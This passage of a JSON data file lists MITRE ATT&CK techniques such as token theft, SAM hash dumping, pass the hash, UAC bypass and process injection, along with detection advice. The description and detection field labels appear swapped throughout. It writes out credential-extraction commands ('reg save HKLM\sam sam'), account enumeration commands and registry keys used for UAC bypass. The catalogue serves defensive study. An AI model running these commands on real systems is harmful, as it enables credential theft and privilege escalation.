                "detection": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1087.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n",
                "detection": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1562.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disable or Modify Tools",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.",
                "detection": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Containers",
                    "IaaS"
                ]
            }
        },
        {
            "id": "T1134.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Parent PID Spoofing",
                "chain_phase": "defense-evasion",
                "description": "Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",
                "detection": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Make and Impersonate Token",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Token Impersonation/Theft",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1056.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Keylogging",
                "chain_phase": "collection",
                "description": "Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.",
                "detection": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Network"
                ]
            }
        },
        {
            "id": "T1003.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Account Manager",
                "chain_phase": "credential-access",
                "description": "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",
                "detection": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Remote Management",
                "chain_phase": "lateral-movement",
                "description": "Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)",
                "detection": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "SSH",
                "chain_phase": "lateral-movement",
                "description": "Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
                "detection": "Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1021.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Distributed Component Object Model",
                "chain_phase": "lateral-movement",
                "description": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.",
                "detection": "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "SMB/Windows Admin Shares",
                "chain_phase": "lateral-movement",
                "description": "Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",
                "detection": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Desktop Protocol",
                "chain_phase": "lateral-movement",
                "description": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
                "detection": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1553.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Code Signing",
                "chain_phase": "defense-evasion",
                "description": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.",
                "detection": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Timestomp",
                "chain_phase": "defense-evasion",
                "description": "Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.",
                "detection": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1550.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Pass the Hash",
                "chain_phase": "defense-evasion",
                "description": "Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",
                "detection": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1548.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Bypass User Account Control",
                "chain_phase": "privilege-escalation",
                "description": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes.",
                "detection": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. \n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.   An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1543.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Service",
                "chain_phase": "persistence",
                "description": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg. \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Hollowing",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dynamic-link Library Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1137.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Office Template Macros",
                "chain_phase": "persistence",
                "description": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)",
                "detection": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "T1197",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "BITS Jobs",
                "chain_phase": "defense-evasion",
                "description": "BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)",
